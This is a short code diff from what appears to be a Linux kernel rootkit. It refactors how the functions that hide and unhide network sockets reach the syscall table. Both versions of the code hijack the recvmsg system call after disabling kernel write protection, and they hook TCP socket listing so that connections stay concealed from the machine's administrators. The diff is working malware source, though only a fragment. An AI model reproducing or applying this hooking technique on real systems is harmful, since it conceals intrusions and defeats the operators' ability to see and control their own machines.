@@ -209,8 +209,8 @@ void hide_sockets(void){
 		}
 
 		disable_wp();
-		orig_sys_recvmsg = syscall_table[__NR_recvmsg];
-		syscall_table[__NR_recvmsg] = my_sys_recvmsg;
+		orig_sys_recvmsg = syscall_table()[__NR_recvmsg];
+		syscall_table()[__NR_recvmsg] = my_sys_recvmsg;
 		enable_wp();
 		is_hidden = 1;
 	}
@@ -222,7 +222,7 @@ void unhide_sockets(void){
 	*tcp_hook_ptr = orig_tcp_seq_show;
 	if(is_hidden == 1){
 		disable_wp();
-		syscall_table[__NR_recvmsg] = orig_sys_recvmsg;
+		syscall_table()[__NR_recvmsg] = orig_sys_recvmsg;
 		enable_wp();
 		is_hidden = 0;
 	}
